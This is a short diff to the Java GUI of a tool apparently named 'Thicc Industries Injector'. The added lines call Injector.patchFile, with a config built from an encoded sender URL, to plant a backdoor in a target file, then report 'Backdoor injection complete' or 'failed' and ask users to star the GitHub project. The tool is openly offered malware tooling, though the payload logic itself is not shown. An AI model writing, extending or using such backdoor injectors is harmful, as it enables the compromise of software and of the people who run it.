@@ -109,6 +109,15 @@ public class InjectorGUI{
 
         System.out.println("[INFO] The Path Of The Main Class Is: " + MainClass);
 
+        Injector.SimpleConfig sc = new Injector.SimpleConfig(encodedSenderURL, MainClass);
+        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
+
+        if(result2){
+            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
+        }else{
+            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
+        }
+
     }
 
     public static void displayError(String message){
